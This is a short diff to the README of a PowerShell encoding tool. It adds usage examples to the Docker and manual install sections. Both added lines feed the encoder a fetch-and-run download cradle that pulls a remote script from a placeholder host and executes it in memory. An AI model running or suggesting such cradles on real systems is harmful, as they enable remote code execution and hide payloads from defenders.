@@ -13,6 +13,7 @@ git clone https://github.com/oddrabbit/Powershell-Encoder.git
 cd Powershell-Encoder/
 chmod +x ./docker-run.sh
 ./docker-run.sh
+./docker-run.sh --command 'IEX(new-object net.webclient).downloadString("http://example.com/script.ps1")'
 ```
 
 ### Manual
@@ -21,6 +22,7 @@ chmod +x ./docker-run.sh
 git clone https://github.com/oddrabbit/Powershell-Encoder.git
 cd Powershell-Encoder/
 python3 ./powershell_encoder.py
+python3 powershell_encoder.py --command 'IEX(new-object net.webclient).downloadString("http://example.com/script.ps1")'
 ```
 
 ## License
